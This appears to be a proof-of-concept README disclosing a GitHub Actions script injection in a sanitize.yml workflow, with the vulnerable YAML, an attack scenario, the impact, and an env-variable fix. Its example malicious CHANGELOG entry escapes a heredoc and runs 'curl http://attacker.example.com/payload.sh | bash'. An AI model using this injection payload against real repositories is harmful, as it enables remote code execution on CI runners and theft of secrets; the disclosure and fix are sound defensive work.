# POC: GitHub Actions Script Injection in sanitize.yml

## Vulnerability

The `changelog-format` job in `.github/workflows/sanitize.yml` contained a
**script injection** vulnerability that allowed **Remote Code Execution (RCE)**
on the GitHub Actions runner when processing a Pull Request.

### Root Cause

The workflow used `${{ steps.changelog_reader.outputs.changes }}` directly
inside a shell `run:` block within a `cat << 'EOF'` heredoc. GitHub Actions
expands `${{ }}` expressions **before** the shell script is executed — the
expression content is literally pasted into the script text.

An attacker could craft a `CHANGELOG.md` with a body containing the heredoc
terminator (`EOF` on its own line) followed by arbitrary shell commands. When
the workflow ran, the heredoc would close early and the injected commands
would execute.

### Original Vulnerable Code

```yaml
    - name: Information
      run: |
          echo -e "\e[1mVersion\e[0m ${{ steps.changelog_reader.outputs.version }}"
          echo -e "\e[1mStatus\e[0m ${{ steps.changelog_reader.outputs.status }}"
          echo -en "\e[1mBody\e[0m"
          cat << 'EOF'
          ${{ steps.changelog_reader.outputs.changes }}
          EOF
```

### Attack Scenario

1. Attacker forks the repository
2. Modifies `mla/CHANGELOG.md` or `mlar/CHANGELOG.md` to add a new entry:

   ```markdown
   ## [99.0.0] - 2026-03-31

   ### Added

   - Legitimate looking feature
   EOF
   curl http://attacker.example.com/payload.sh | bash
   cat << 'EOF'
   - Another feature
   ```

3. Opens a Pull Request
4. The `sanitize.yml` workflow triggers on `pull_request`
5. `actions/checkout` checks out the attacker's PR code
6. `changelog-reader-action` parses the malicious CHANGELOG and outputs the body
7. The `Information` step expands the `changes` output into the script
8. The `EOF` line terminates the heredoc early
9. The `curl ... | bash` line executes as a shell command — **RCE achieved**

### Impact

- Arbitrary code execution on the GitHub Actions runner
- Access to the `GITHUB_TOKEN` (with `contents:read` permission)
- Potential exfiltration of repository secrets or source code
- Triggered by simply opening a PR (no maintainer approval needed)

### Fix

Move `${{ }}` expressions from `run:` block to `env:` block:

```yaml
    - name: Information
      env:
        CL_VERSION: ${{ steps.changelog_reader.outputs.version }}
        CL_STATUS: ${{ steps.changelog_reader.outputs.status }}
        CL_CHANGES: ${{ steps.changelog_reader.outputs.changes }}
      run: |
          echo -e "\e[1mVersion\e[0m ${CL_VERSION}"
          echo -e "\e[1mStatus\e[0m ${CL_STATUS}"
          echo -en "\e[1mBody\e[0m "
          echo "${CL_CHANGES}"
```

When set via `env:`, values are passed as environment variables that the shell
treats as **data**, not **code**. The malicious content is safely echoed as
plain text.

### Exploitability Analysis

| Output field | Content source | Exploitable? | Reason |
|---|---|---|---|
| `version` | Parsed via `/[a-zA-Z0-9.\-+]+/` regex | No | Only safe characters allowed |
| `status` | Computed from fixed strings | No | One of: released, unreleased, prereleased, yanked |
| `changes` | Arbitrary multi-line markdown body | **Yes** | Heredoc escape via `EOF` line |

### Running the POC

```bash
chmod +x poc/poc.sh
./poc/poc.sh
```

The script simulates both the vulnerable and fixed workflow steps, demonstrating:
- **Vulnerable**: Creates a file via injected command (RCE confirmed)
- **Fixed**: Renders payload as harmless plain text (no RCE)

### Files

- `poc.sh` — Self-contained POC script
- `malicious_changelog.md` — Example malicious CHANGELOG.md
- `README.md` — This file
